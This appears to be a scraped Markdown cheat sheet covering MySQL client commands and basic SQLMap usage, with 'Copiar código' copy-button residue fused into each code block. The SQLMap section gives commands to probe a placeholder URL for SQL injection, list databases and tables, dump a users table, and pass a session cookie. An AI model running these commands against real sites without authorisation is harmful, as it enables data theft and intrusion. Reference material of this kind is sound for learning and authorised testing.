# SQL

#### Connecting to a MySQL Database

```bash
bashCopiar códigomysql -u [username] -p -h [host] [database]
```

* Example: `mysql -u root -p -h 127.0.0.1 testdb`
* After entering the command, you’ll be prompted for the MySQL password.

#### Common SQL Commands

1.  **Show Databases**

    ```sql
    sqlCopiar códigoSHOW DATABASES;
    ```
2.  **Use a Database**

    ```sql
    sqlCopiar códigoUSE [database_name];
    ```
3.  **Show Tables in the Database**

    ```sql
    sqlCopiar códigoSHOW TABLES;
    ```
4.  **Describe Table Structure**

    ```sql
    sqlCopiar códigoDESCRIBE [table_name];
    ```
5.  **Select Data from a Table**

    ```sql
    sqlCopiar códigoSELECT * FROM [table_name];
    ```

    * Example: `SELECT * FROM users;`
6.  **Insert Data into a Table**

    ```sql
    sqlCopiar códigoINSERT INTO [table_name] (column1, column2) VALUES ('value1', 'value2');
    ```

    *   Example:

        ```sql
        sqlCopiar códigoINSERT INTO users (name, age) VALUES ('John Doe', 30);
        ```
7.  **Update Data in a Table**

    ```sql
    sqlCopiar códigoUPDATE [table_name] SET [column] = 'value' WHERE [condition];
    ```

    *   Example:

        ```sql
        sqlCopiar códigoUPDATE users SET age = 31 WHERE name = 'John Doe';
        ```
8.  **Delete Data from a Table**

    ```sql
    sqlCopiar códigoDELETE FROM [table_name] WHERE [condition];
    ```

    *   Example:

        ```sql
        sqlCopiar códigoDELETE FROM users WHERE name = 'John Doe';
        ```
9.  **Create a New Table**

    ```sql
    sqlCopiar códigoCREATE TABLE [table_name] (
      id INT AUTO_INCREMENT,
      name VARCHAR(255),
      age INT,
      PRIMARY KEY (id)
    );
    ```
10. **Drop a Table**

```sql
sqlCopiar códigoDROP TABLE [table_name];
```

#### SQLMap Basics

**1. Basic Usage**

```bash
bashCopiar códigosqlmap -u "http://target.com/page.php?id=1"
```

* This scans the target URL for SQL injection vulnerabilities.

**2. Specify Database**

```bash
bashCopiar códigosqlmap -u "http://target.com/page.php?id=1" --dbs
```

* Retrieves a list of databases from the target.

**3. Select a Specific Database**

```bash
bashCopiar códigosqlmap -u "http://target.com/page.php?id=1" -D [database_name] --tables
```

* Example: `sqlmap -u "http://target.com/page.php?id=1" -D testdb --tables`
* Lists the tables in the specified database.

**4. Dump Data from a Table**

```bash
bashCopiar códigosqlmap -u "http://target.com/page.php?id=1" -D [database_name] -T [table_name] --dump
```

* Example: `sqlmap -u "http://target.com/page.php?id=1" -D testdb -T users --dump`
* Dumps the data from the specified table.

**5. Automatic Form Authentication**

```bash
bashCopiar códigosqlmap -u "http://target.com/page.php?id=1" --forms --batch
```

* Scans forms for SQL injection automatically.

**6. Specify Cookie for Authentication**

```bash
bashCopiar códigosqlmap -u "http://target.com/page.php?id=1" --cookie="PHPSESSID=xyz123"
```

* Use this if the target requires authentication via cookies.
